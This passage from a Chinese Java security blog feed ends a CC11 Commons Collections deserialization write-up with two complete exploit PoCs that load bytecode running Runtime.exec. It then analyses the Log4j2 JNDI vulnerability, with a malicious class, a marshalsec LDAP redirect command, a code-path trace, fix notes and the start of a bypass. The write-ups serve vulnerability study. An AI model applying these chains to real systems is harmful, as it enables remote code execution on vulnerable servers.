class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">        <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">        <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">        <span class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">        HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hs);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc11payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img src="/posts/7e9687c7/cc11-12.png" title="执行效果"></p><h3 id="cc11-poc-hashmap"><a href="#cc11-poc-hashmap" class="headerlink" title="cc11-poc(hashmap)"></a>cc11-poc(hashmap)</h3><p>同理，hashmap同样能作为反序列化入口（hashset相当于套用了hashmap，可以理解为固定value值的hashmap）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">        <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">        <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">        <span class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">        HashMap hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">1</span>);</span><br><span class="line">        hm.put(<span class="string">&quot;any&quot;</span>,<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //获取hashset中的hashmap对象属性</span></span><br><span class="line"><span class="comment">//        Field hsset = HashSet.class.getDeclaredField(&quot;map&quot;);</span></span><br><span class="line"><span class="comment">//        hsset.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        HashMap hsmap=(HashMap) hsset.get(hm);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(hm);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc11payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行效果：</p><p><img src="/posts/7e9687c7/cc11-13.png" title="执行效果"></p><h1 id="0x02、总结"><a href="#0x02、总结" class="headerlink" title="0x02、总结"></a>0x02、总结</h1><p>cc11很好理解，cc2+cc6的组合变式，将<code>invokerTransformer</code>利用方向替换为调用<code>newTransformer</code>方法，依旧使用<code>hashset</code>(<code>hashmap</code>同理，cc6中提及)作为反序列化入口，通过<code>TiedMapEntry</code>传入<code>lazymap</code>和<code>TemplatesImpl</code>对象，来达到调用<code>TemplatesImpl.newTransformer</code>的目的触发漏洞。</p><p>cc11也是在cc3.1-3.2.1组件上使用字节码加载的利用链，在之前cc链的字节码加载都是在cc4版本组件上适用，因此cc11链适用范围比前面的利用链跟广。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-Log4j2漏洞原理学习与分析</title>
      <link href="/posts/6e79ce8b.html"/>
      <url>/posts/6e79ce8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>原理篇到Log4j2部分，拖得有点久了，继续学习分析</p><h1 id="0x01、Log4j2描述"><a href="#0x01、Log4j2描述" class="headerlink" title="0x01、Log4j2描述"></a>0x01、Log4j2描述</h1><p>引用描述：</p><blockquote><p>Apache log4j2是一款开源的Java日志记录框架,提供方便的日志记录，通过定义每一条日志信息的级别，能够更加细致地控制日志生成过程，以便用于编写程序时进行调试，在项目上线后出现状况时也可根据日志记录来判断原因，被广泛大量用于业务系统开发环境中。</p></blockquote><p>由于log4j2的优秀性能，大量java开发系统进行使用，导致影响范围极其广泛。</p><h1 id="0x02、影响范围"><a href="#0x02、影响范围" class="headerlink" title="0x02、影响范围"></a>0x02、影响范围</h1><p>log4j版本 &lt;&#x3D; 2.14.1</p><h1 id="0x03、环境搭建"><a href="#0x03、环境搭建" class="headerlink" title="0x03、环境搭建"></a>0x03、环境搭建</h1><p>项目中pom.xml添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/6e79ce8b/l-1.png" title="环境依赖"></p><h1 id="0x04、漏洞利用"><a href="#0x04、漏洞利用" class="headerlink" title="0x04、漏洞利用"></a>0x04、漏洞利用</h1><p>恶意类编译成class文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类存放位置：</p><p><img src="/posts/6e79ce8b/l-3.png" title="恶意类"></p><p>在恶意类位置开启http服务：</p><p><img src="/posts/6e79ce8b/l-2.png" title="http服务"></p><p>借助marshalsec服务开启ldap服务：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//192.168.43.233:8999/#EvilPayload 9998</span></span><br></pre></td></tr></table></figure><p><img src="/posts/6e79ce8b/l-4.png" title="ldap服务"></p><p>漏洞利用，在log日志记录处输入payload，执行触发漏洞:</p><p><img src="/posts/6e79ce8b/l-5.png" title="执行payload"></p><h1 id="0x05、漏洞分析"><a href="#0x05、漏洞分析" class="headerlink" title="0x05、漏洞分析"></a>0x05、漏洞分析</h1><p>整体来说还是jndi注入的问题，只不过前面经过一系列log4j对字符串的处理取值，最后再执行jndi注入，跟下完整步骤。</p><p>日志记录点处断点：</p><p><img src="/posts/6e79ce8b/l-6.png" title="断点"></p><p>跟进断点，会先进入<code>logIfEnabled</code>方法判断是否开启log日志功能</p><p><img src="/posts/6e79ce8b/l-7.png" title="是否开启日志"></p><p>开启条件需要使用调用的方法值小于&#x3D;&lt;200（注：调用方法的安全等级可以在配置文件中进行修改，修改后的调用方法同样可触发漏洞）</p><p><img src="/posts/6e79ce8b/l-11.png" title="开启条件"></p><p>不同方法对应的level值：<br><img src="/posts/6e79ce8b/l-12.png" title="开启条件"></p><p>调用的<code>error</code>方法值为200，因此能进入到下面的方法，进入到<code>logmassage</code>方法（日志消息方法）中，继续跟进<code>logmassage</code>方法</p><p><img src="/posts/6e79ce8b/l-8.png" title="logmassage"></p><p>接着进入<code>logMessageSafely</code>方法（安全的日志消息方法）中，继续跟进</p><p><img src="/posts/6e79ce8b/l-9.png" title="logMessageTrackRecursion"></p><p>接着进入<code>logMessageTrackRecursion</code>方法（日志消息跟踪递归方法）中</p><p><img src="/posts/6e79ce8b/l-10.png" title="logMessageTrackRecursion"></p><p>进入<code>tryLogMessage</code>方法（尝试记录日志消息方法）</p><p><img src="/posts/6e79ce8b/l-13.png" title="tryLogMessage"></p><p>进而调用log方法，继续跟进</p><p><img src="/posts/6e79ce8b/l-14.png" title="log"></p><p>再进入到<code>LocationAwareReliabilityStrategy</code>的log方法中</p><p><img src="/posts/6e79ce8b/l-15.png" title="LocationAwareReliabilityStrategy.log"><br><img src="/posts/6e79ce8b/l-16.png" title="LocationAwareReliabilityStrategy.log"></p><p>进入到<code>LoggerConfig.log</code>方法中，通过调用<code>createEvent</code>方法将日志消息相关的所有信息封装进一个<code>logEvent</code>对象中</p><p><img src="/posts/6e79ce8b/l-17.png" title="createEvent"><br><img src="/posts/6e79ce8b/l-18.png" title="createEvent"></p><p>创建完后，再调用log方法去处理<code>logEvent</code>对象，跟进</p><p><img src="/posts/6e79ce8b/l-19.png" title="log"></p><p>会经过<code>isFiltered</code>方法判断该对象是否是被过滤的对象</p><p><img src="/posts/6e79ce8b/l-20.png" title="isFiltered"></p><p>由于<code>filter</code>未被调用过赋值过，因此默认为null，因此会返回0，前面由于存在！不等号，因此请求结果为true，进入下一步调用<code>processLogEvent</code>方法</p><p><img src="/posts/6e79ce8b/l-21.png" title="isFiltered"></p><p>跟进<code>processLogEvent</code>方法，调用关键的<code>callAppenders</code>方法</p><p><img src="/posts/6e79ce8b/l-22.png" title="callAppenders"></p><p>这里会调用到<code>appender</code>组件（负责写日志的组件），常见的子类（ConsoleAppender：将日志添加到控制台输出；FileAppender：将日志输入到指定文件中；RollingFileAppender：滚动日志记录，当满足某条件时，将日志输入到指定文件中），这里调用的<code>ConsoleAppender</code></p><p><img src="/posts/6e79ce8b/l-23.png" title="callAppenders"></p><p>然后调用<code>ConsoleAppender</code>的<code>callAppender</code>方法，接着调用<code>callAppenderPreventRecursion</code>方法处理事件</p><p><img src="/posts/6e79ce8b/l-24.png" title="callAppenderPreventRecursion"></p><p><code>callAppenderPreventRecursion</code>方法中调用<code>callAppender0</code>方法</p><p><img src="/posts/6e79ce8b/l-26.png" title="callAppender0"></p><p><code>callAppender0</code>方法会先通过<code>isFilteredByAppender</code>方法判断<code>appender</code>是否是<code>Filterable</code>的子类和判断事件的类型是否是<code>DENY</code></p><p><img src="/posts/6e79ce8b/l-27.png" title="tryCallAppender"></p><p><img src="/posts/6e79ce8b/l-28.png" title="类型判断"></p><p>由于不是因此进入判断体调用<code>tryCallAppender</code>方法，跟进<code>tryCallAppender</code>方法</p><p>该方法调用事件处理器调用<code>append</code>添加事件方法</p><p><img src="/posts/6e79ce8b/l-29.png" title="tryCallAppender"></p><p>跟进<code>append</code>方法，调用<code>tryAppend</code>方法，然后再调用<code>directEncodeEvent</code>方法编码事件</p><p><img src="/posts/6e79ce8b/l-30.png" title="directEncodeEvent"></p><p>跟进<code>directEncodeEvent</code>方法，接着调用<code>encode</code>方法</p><p><img src="/posts/6e79ce8b/l-31.png" title="encode"></p><p>调用<code>toText</code>方法序列化事件数据，然后调用<code>toSerializable</code>方法序列化</p><p><img src="/posts/6e79ce8b/l-32.png" title="toText"></p><p>然后针对格式程序数组<code>formatters[]</code>进行循环调用<code>format</code>格式化数据</p><p><img src="/posts/6e79ce8b/l-33.png" title="formatters"></p><p>漏洞触发位置为<code>Message</code>的格式程序的<code>format</code>处理</p><p><img src="/posts/6e79ce8b/l-34.png" title="formatters"></p><p>跟进到序号8的<code>format</code>处理，调用<code>MessagePatternConverter</code>针对<code>Message</code>的转换器<code>format</code>格式化处理数据</p><p><img src="/posts/6e79ce8b/l-35.png" title="formatters"></p><p>跟进<code>format</code>格式化处理数据，先是获取<code>message</code>信息</p><p><img src="/posts/6e79ce8b/l-36.png" title="获取message信息"></p><p>然后进入判断，<code>config</code>存在，并且允许调用<code>Lookup</code>方法，则进入循环体</p><p><img src="/posts/6e79ce8b/l-37.png" title="条件判断"></p><p>然后对<code>workingBuilder</code>内容进行搜寻字符串如果存在<code>$&#123;</code>符号，则截取完整字符串</p><p><img src="/posts/6e79ce8b/l-38.png" title="截取${字符串"><br><img src="/posts/6e79ce8b/l-39.png" title="截取${字符串"></p><p>对<code>workingBuilder</code>内容添加<code>append</code>事件，但会再次对数据进行处理，通过<code>getStrSubstitutor</code>方法获取<code>StrSubstitutor</code>对象，然后调用<code>replace</code>方法替换字符串</p><p><img src="/posts/6e79ce8b/l-40.png" title="替换字符串"></p><p>跟进<code>replace</code>方法，调用<code>substitute</code>方法</p><p><img src="/posts/6e79ce8b/l-41.png" title="substitute"></p><p>跟进<code>substitute</code>方法</p><p><img src="/posts/6e79ce8b/l-42.png" title="substitute"><br><img src="/posts/6e79ce8b/l-43.png" title="substitute"></p><p>前半段的变量表示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//prefixMatcher表示&#x27;$&#123;&#x27;前缀</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">prefixMatcher</span> <span class="operator">=</span> getVariablePrefixMatcher();</span><br><span class="line"><span class="comment">//suffixMatcher表示&#x27;&#125;&#x27;后缀</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">suffixMatcher</span> <span class="operator">=</span> getVariableSuffixMatcher();</span><br><span class="line"><span class="comment">//escape表示&#x27;$&#x27;</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">char</span> <span class="variable">escape</span> <span class="operator">=</span> getEscapeChar();</span><br><span class="line"><span class="comment">//valueDelimiterMatcher表示&#x27;:-&#x27;</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">valueDelimiterMatcher</span> <span class="operator">=</span> getValueDelimiterMatcher();</span><br><span class="line"><span class="comment">//substitutionInVariablesEnabled为true，表示启动变量替换</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">substitutionInVariablesEnabled</span> <span class="operator">=</span> isEnableSubstitutionInVariables();</span><br></pre></td></tr></table></figure><p>然后就是判断位置，截选${}里的内容</p><p><img src="/posts/6e79ce8b/l-44.png" title="判断位置"><br><img src="/posts/6e79ce8b/l-45.png" title="截选内容"></p><p>取到${}里的内容后，再对内容进行<code>:\-</code>分割取值<br>如内容为<code>a:\-b</code>，则截选出来值为<code>varname=a</code>,<code>varDefaultValue=b</code>，如果内容中的-号本身就是名称本身，则使用<code>a:\\-b</code>形式转义-号<br>如内容为<code>a:-b</code>,则截选出来值为<code>varname=a</code>,<code>varDefaultValue=b</code></p><p><img src="/posts/6e79ce8b/l-46.png" title="截选内容"></p><p>如果不是上述情况：如内容为<code>a:b</code>，则<code>varname=a:b</code>,<code>varDefaultValue=null</code></p><p><img src="/posts/6e79ce8b/l-47.png" title="截选内容"></p><p>截选完后，下一步调用到<code>resolveVariable</code>方法</p><p><img src="/posts/6e79ce8b/l-48.png" title="resolveVariable"></p><p>跟进<code>resolveVariable</code>方法，调用到<code>lookup</code>方法</p><p><img src="/posts/6e79ce8b/l-49.png" title="lookup"></p><p>跟进<code>lookup</code>方法，前半段是获取内容<code>:</code>前的前缀，识别到<code>jndi</code>，然后查询<code>strLookupMap</code>表，找到<code>jndi</code>对应值获取到<code>jndilookup</code></p><p><img src="/posts/6e79ce8b/l-50.png" title="lookup"><br><img src="/posts/6e79ce8b/l-51.png" title="jndilookup"></p><p>然后调用<code>JndiLookup.lookup</code>方法</p><p><img src="/posts/6e79ce8b/l-52.png" title="jndilookup.lookup"></p><p>触发漏洞</p><p><img src="/posts/6e79ce8b/l-53.png" title="触发漏洞"></p><h1 id="0x06、修复情况"><a href="#0x06、修复情况" class="headerlink" title="0x06、修复情况"></a>0x06、修复情况</h1><p>官方<a href="https://logging.apache.org/log4j/2.x/security.html">修复声明</a>文档</p><p><img src="/posts/6e79ce8b/l-54.png" title="修复"></p><p>2.15.0正式版本修复：关闭了jndi协议，添加白名单机制，只允许本地访问ldap</p><p><img src="/posts/6e79ce8b/l-55.png" title="修复措施"></p><p>2.16.0正式版本修复：日志不再支持lookup功能，lookup功能在配置中仍然可用</p><p>2.17.0正式版本修复：移除LDAP，JNDI连接仅在java协议中被支持</p><p>在2.15.0正式版本之前，依次推出了2.15.0-rc1、2.15.0-rc2的两次补丁，其中rc1存在问题，rc2算是修复rc1的补丁，但这两次rc版本都没在官网上进行发布，而是直接发布在github上，官网正式发布版本为2.15.0，在其之后。</p><hr><p>在部署2.15.0-rc1版本中出了问题，很多仓库都没有rc1版本只有2.15.0的正式版，耽误了很多时间，就按2.15.0正式版本部署上去看区别吧</p><p>在运行流程中toText后格式化信息步骤就跟2.14.0版本发生了变化，到format格式化步骤</p><p><img src="/posts/6e79ce8b/l-59.png" title="格式化步骤"></p><p>这里的转换器变成了<code>MessagePatternConverter</code>类的内部类<code>SimpleMessagePatternConverter</code>来进行处理</p><p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p><p>因此调用的<code>format</code>方法为调用到该类的<code>formatTo</code>方法</p><p><img src="/posts/6e79ce8b/l-61.png" title="formatTo"></p><p>跟进<code>append</code>方法</p><p><img src="/posts/6e79ce8b/l-62.png" title="append"><br><img src="/posts/6e79ce8b/l-63.png" title="append"><br><img src="/posts/6e79ce8b/l-64.png" title="append"></p><p>这里直接返回输出信息，并不会对信息中的${进行匹配处理</p><p><img src="/posts/6e79ce8b/l-65.png" title="输出"></p><p>到此输出完成，运行结束，其中没有涉及${的匹配处理，也没有调用jndi。</p><p>除此之外，2.15.0-rc1版本开始还对lookup方法进行了修改，添加了条件判断，仅允许本地访问jndi和ldap，也对反序列化数据进行了校验</p><p><img src="/posts/6e79ce8b/l-66.png" title="修复措施"></p><h1 id="0x07、2-15-0-rc1绕过"><a href="#0x07、2-15-0-rc1绕过" class="headerlink" title="0x07、2.15.0-rc1绕过"></a>0x07、2.15.0-rc1绕过</h1><p>根据2.15.0-rc1的修复情况目前知道的点：</p><ul><li>默认情况会调用<code>SimpleMessagePatternConverter</code>类来转换数据并直接输出。</li><li>默认关闭了jndi调用。</li></ul><p>也就是说想要继续匹配<code>$&#123;</code>内容，必须更改转换器，并且开启jndi的调用才能进入到最后的<code>lookup</code>调用的步骤（先不考虑仅允许本地地址调用jndi这个地方，先考虑如何到这里）</p><p>在更换成的<code>MessagePatternConverter</code>类中，存在一个类<code>LookupMessagePatternConverter</code>，该类就跟2.14.0的版本步骤差不多，匹配${截取替换</p><p><img src="/posts/6e79ce8b/l-67.png" title="修复措施"></p><p>也就是将下面的转换器更改成<code>LookupMessagePatternConverter</code>类</p><p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p><p><code>MessagePatternConverter</code>类的初始化方法<code>newInstance</code>提供了更换转换器，但需要满足条件：</p><ul><li>lookups变量要为true</li><li>存在config</li></ul><p><img 